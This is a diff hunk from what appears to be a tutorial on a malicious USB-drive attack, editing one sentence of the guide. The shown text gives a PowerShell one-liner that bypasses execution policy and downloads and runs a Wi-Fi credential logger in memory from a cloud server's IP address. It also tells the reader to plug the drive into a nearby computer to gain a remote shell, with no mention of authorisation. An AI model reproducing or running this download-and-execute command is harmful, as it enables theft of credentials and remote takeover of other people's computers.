@@ -165,7 +165,7 @@ Finally, we can host a python server in the directory where we have our reverse 
 
 ⚠️ Make sure you don't have an important thing in that directory before hosting public, and make sure you have your services very secure. 
 
-Now, visit your EC2 public ip address in the browser, and you should see the files being hosted in the public. So in our malicious script, the target would load `'powershell -ep bypass -c "iex (iwr http://52.202.38.242/wifilogger.ps1)"'`, which visits our public ip and executes the powershell script in memory, that's why we need to host the files in public to be reachable. You can leave your server running in the cloud for days or weeks, The free tier offers 600 hours of free service I think.
+Now, visit your EC2 public ip address in the browser, and you should see the files being hosted in the public. So in our malicious script, the target would execute this line `'powershell -ep bypass -c "iex (iwr http://52.202.38.242/wifilogger.ps1)"'`, which visits our public ip and executes the powershell script in memory, that's why we need to host the files in public to be reachable. You can leave your server running in the cloud for days or weeks, The free tier offers 600 hours of free service I think.
 
 Plug the drive into a nearby computer (this executes in less than six seconds), then return to your cloud instances, you should have a shell by now. Even if the target disconnects or there’s a break in the connection, don’t panic. The following line within the code
 
